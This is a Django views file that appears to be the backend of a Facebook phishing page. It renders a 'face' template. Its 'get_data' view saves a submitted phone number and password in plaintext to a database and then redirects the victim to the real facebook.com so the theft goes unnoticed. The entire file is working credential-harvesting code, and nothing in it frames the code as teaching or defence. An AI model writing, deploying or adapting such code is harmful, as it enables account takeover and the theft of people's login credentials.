from django.shortcuts import render
from django.http import HttpResponseRedirect
from .models import app
from . import models

# Create your views here.


def face(request):
    return render(request, 'face/face.html')


def get_data(request):
    if request.method == 'POST':
        number = request.POST['number']
        password = request.POST['password']
        app = models.app.objects.create(number=number, password=password)
        app.save()
    return HttpResponseRedirect('Http://www.facebook.com')


